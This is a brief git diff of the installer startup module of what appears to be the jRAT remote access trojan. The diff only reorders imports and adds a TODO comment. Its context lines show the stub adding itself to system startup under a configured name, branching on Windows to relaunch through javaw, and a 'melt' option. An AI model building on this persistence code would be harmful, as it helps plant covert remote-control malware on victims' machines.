@@ -4,7 +4,6 @@ import io.jrat.common.DropLocations;
 import io.jrat.common.crypto.CryptoUtils;
 import io.jrat.stub.Configuration;
 import io.jrat.stub.utils.Utils;
-
 import java.awt.Desktop;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -14,16 +13,13 @@ import java.util.Map;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 import java.util.zip.ZipOutputStream;
-
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
 import javax.crypto.spec.SecretKeySpec;
 import javax.swing.JOptionPane;
 import javax.swing.UIManager;
-
+import oslib.OperatingSystem;
 import startuplib.Startup;
-
-import com.redpois0n.oslib.OperatingSystem;
 
 public class InstallerStartupModule extends StartupModule {
 	
@@ -183,7 +179,7 @@ public class InstallerStartupModule extends StartupModule {
 				
 				Startup.add(Configuration.getConfig().get("name"), file);
 				
-                if (!runNextBoot && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+                if (!runNextBoot && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) { // TODO
 					String javaPath = System.getProperty("java.home") + "\\bin\\javaw";
 
 					if (melt) {
